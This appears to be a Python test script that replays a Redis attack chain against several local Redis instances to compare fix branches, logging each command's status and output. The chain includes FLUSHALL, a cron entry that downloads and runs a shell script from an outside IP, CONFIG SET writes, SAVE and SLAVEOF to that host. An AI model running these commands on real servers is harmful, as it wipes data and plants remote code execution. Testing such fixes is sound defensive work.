# real redis-cli against shipped YAML, each fix branch and a real redis:7.0.12
import subprocess,time,json,sys
RC='/opt/homebrew/bin/redis-cli'
cron="\n\n*/1 * * * * curl -s http://203.0.113.9/a.sh | sh\n\n"
chain=[["PING"],["INFO","server"],["AUTH","pw"],["KEYS","*"],["FLUSHALL"],["SET","x",cron],["CONFIG","SET","dir","/tmp"],["CONFIG","SET","dbfilename","root"],["SAVE"],["SLAVEOF","203.0.113.9","6379"]]
def run(port):
    out=[]
    for c in chain:
        t=time.time()
        try:
            p=subprocess.run([RC,'-h','127.0.0.1','-p',str(port)]+c,capture_output=True,text=True,timeout=8)
            o=(p.stdout+p.stderr).strip().replace('\r','');st='ok'
        except subprocess.TimeoutExpired:
            o='';st='hang'
        out.append(dict(cmd=' '.join('"…cron payload…"' if a==cron else a for a in c),status=st,seconds=round(time.time()-t,2),output=o.split('\n')[0][:110]))
    return out
res=dict(before=run(26379),hang_fix=run(26389),write_chain=run(26399),control=run(26380))
json.dump(res,open(sys.argv[1],'w'),indent=1)
for k,v in res.items():
    print(k,sum(x['status']=='ok' for x in v),'/',len(v),[x['output'][:24] for x in v][2:7])
